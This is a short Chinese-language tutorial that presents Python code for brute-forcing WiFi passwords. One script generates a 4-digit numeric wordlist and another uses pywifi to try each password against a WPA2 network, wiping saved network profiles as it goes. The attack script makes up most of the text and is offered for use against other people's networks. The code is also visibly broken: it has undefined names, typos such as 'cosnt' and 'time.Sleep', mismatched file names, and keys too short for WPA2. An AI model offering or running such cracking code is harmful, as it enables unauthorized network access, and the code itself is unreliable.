# Python破解wifi密码

## 生成密码本

使用`itertools`工具生成密码本，`pip install itertools`

```python
words = '1234567890'
r = its.product(words, repeat=4)

with open('./passwords.txt', 'a') as tempfile:
    for i in r:
        tempfile.write(''.join(i))
        tempfile.write('\n')
```

## 暴力破解wifi密码

使用工具`pywifi`，用命令`pip install pywifi`

```python
# 获取wifi网卡
import pywifi
from pywifi import const



def wifi_connect(pwd):
    wifi = pywifi.PyWifi()
    ifaces = wifi.interfaces()[0]
    print(ifaces.name())
    ifaces.disconnect()
    time.Sleep(1)

    if ifaces.status() != cosnt.IFACE_DISCONNECTED:
        print("already connected")

    # 创建连接文件
    profile = pywifi.Profile()
    profile.ssid = '网卡ssid'
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = pwd

    # 删除所有连接过的wifi文件
    ifaces.remove_all_network_profiles()
    # 设置行的连接文件
    tep_profile = ifaces.add_network_profile(profile)
    ifaces.connect(tep_profile)
    # wifi连接时间
    time.sleep(3)

    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def hack_wifi():
    with open("./password.txt") as tempfile:
        for line in tempfile.readlines():
            if wifi_connect(line):
                print('Success: ', line)
            
```

## Ref

[Python最新暴力破解WiFi，攻破所有密码限制，最强破解！](https://mp.weixin.qq.com/s/tA0z8clJz-T7Q6QMaZOykw)